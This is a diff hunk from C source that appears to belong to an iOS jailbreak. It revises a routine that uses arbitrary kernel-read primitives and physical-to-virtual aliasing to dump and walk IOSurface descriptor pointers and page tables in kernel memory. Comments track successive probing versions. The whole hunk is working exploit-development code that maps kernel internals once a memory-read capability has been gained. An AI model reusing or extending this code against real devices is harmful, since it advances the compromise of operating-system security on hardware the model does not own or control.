@@ -300,44 +300,46 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 
 		// v99 (v98 verdict): desc+0x60's array is the ECHOED CREATE INPUT
 		// (s0==s2=dummyPageVA, s1=dummyPageSize — user-VA {addr,size}
-		// pairs), NOT the wire's packed output. The packed page list
-		// (§55's VM_PAGE_PACKED, base 0xffffffdc shift 6) lives elsewhere
-		// — prime suspects: the descriptor's own pointer fields d70/d18/
-		// d90 (real kernel pointers in every v75+ pre,desc capture).
-		// v99 = LOCATOR ONLY: alias-dump the first qwords behind each
-		// candidate pointer. No writes — one unknown per launch.
+		// pairs), NOT the wire's packed output.
+		// v100 = DEEP DUMP of the two live candidates (v99 located them):
+		//   d70 — SHARED across all windows, q0=0xb022000000 (packed
+		//         page-number family, shift-8), q2=0x10100000014 (packed
+		//         pair + flags) — global packed-page arena/array suspect.
+		//   d90 — PER-SURFACE (q2 moved e38aabc000→d3c000 with each fresh
+		//         surface) — the surface's own wired-page table suspect.
+		// 16 qwords each through the alias (proven read class), and for
+		// d90 also walk q2 (its moving pointer) one level deeper.
 		uint64_t d70 = kread64(desc + 0x70);
-		uint64_t d18 = kread64(desc + 0x18);
 		uint64_t d90 = kread64(desc + 0x90);
-		jb_tr_beacon("KMAP cand,d70=%llx,d18=%llx,d90=%llx",
-		             (unsigned long long)d70, (unsigned long long)d18,
-		             (unsigned long long)d90);
+		jb_tr_beacon("KMAP cand,d70=%llx,d90=%llx",
+		             (unsigned long long)d70, (unsigned long long)d90);
 		uint64_t a70 = d70 ? phystokv(kvtophys(d70)) : 0;
-		uint64_t a18 = d18 ? phystokv(kvtophys(d18)) : 0;
 		uint64_t a90 = d90 ? phystokv(kvtophys(d90)) : 0;
-		jb_tr_beacon("KMAP cand,al70=%llx,al18=%llx,al90=%llx",
-		             (unsigned long long)a70, (unsigned long long)a18,
-		             (unsigned long long)a90);
-		if (a70) jb_tr_beacon("KMAP d70,q=%llx,%llx,%llx",
-		             (unsigned long long)kread64(a70),
-		             (unsigned long long)kread64(a70 + 8),
-		             (unsigned long long)kread64(a70 + 16));
-		if (a18) jb_tr_beacon("KMAP d18,q=%llx,%llx,%llx",
-		             (unsigned long long)kread64(a18),
-		             (unsigned long long)kread64(a18 + 8),
-		             (unsigned long long)kread64(a18 + 16));
-		if (a90) jb_tr_beacon("KMAP d90,q=%llx,%llx,%llx",
-		             (unsigned long long)kread64(a90),
-		             (unsigned long long)kread64(a90 + 8),
-		             (unsigned long long)kread64(a90 + 16));
-		// Surface-object ranges element too (§55's original packed source):
-		uint64_t sranges = kread64(surface + 0x360);
-		jb_tr_beacon("KMAP s360=%llx", (unsigned long long)sranges);
-		if (sranges) {
-			uint64_t asr = phystokv(kvtophys(sranges));
-			if (asr) jb_tr_beacon("KMAP s360,q=%llx,%llx",
-			             (unsigned long long)kread64(asr),
-			             (unsigned long long)kread64(asr + 8));
+		jb_tr_beacon("KMAP cand,al70=%llx,al90=%llx",
+		             (unsigned long long)a70, (unsigned long long)a90);
+		if (a70) {
+			int n70 = (seq == 0) ? 16 : 3;   // window 0: full dump; rest: spot
+			for (int qi = 0; qi < n70; qi++)
+				jb_tr_beacon("KMAP d70,q%d=%llx", qi,
+				             (unsigned long long)kread64(a70 + 8 * qi));
+		}
+		if (a90) {
+			int n90 = (seq == 0) ? 16 : 3;
+			for (int qi = 0; qi < n90; qi++)
+				jb_tr_beacon("KMAP d90,q%d=%llx", qi,
+				             (unsigned long long)kread64(a90 + 8 * qi));
+			// deref the moving q2 (per-surface pointer) one level deeper —
+			// full 8-qword dump on window 0 (it changes per surface, but the
+			// STRUCTURE is what we need; windows 1+ skip the deep walk)
+			uint64_t q2 = kread64(a90 + 16);
+			uint64_t aq2 = q2 ? phystokv(kvtophys(q2)) : 0;
+			jb_tr_beacon("KMAP d90,q2=%llx,al=%llx",
+			             (unsigned long long)q2, (unsigned long long)aq2);
+			if (aq2 && seq == 0) {
+				for (int qi = 0; qi < 8; qi++)
+					jb_tr_beacon("KMAP d90q2,q%d=%llx", qi,
+					             (unsigned long long)kread64(aq2 + 8 * qi));
+			}
 		}
 
 		// Re-wire: drain to 0 (unwire) → increment (re-wire reading the
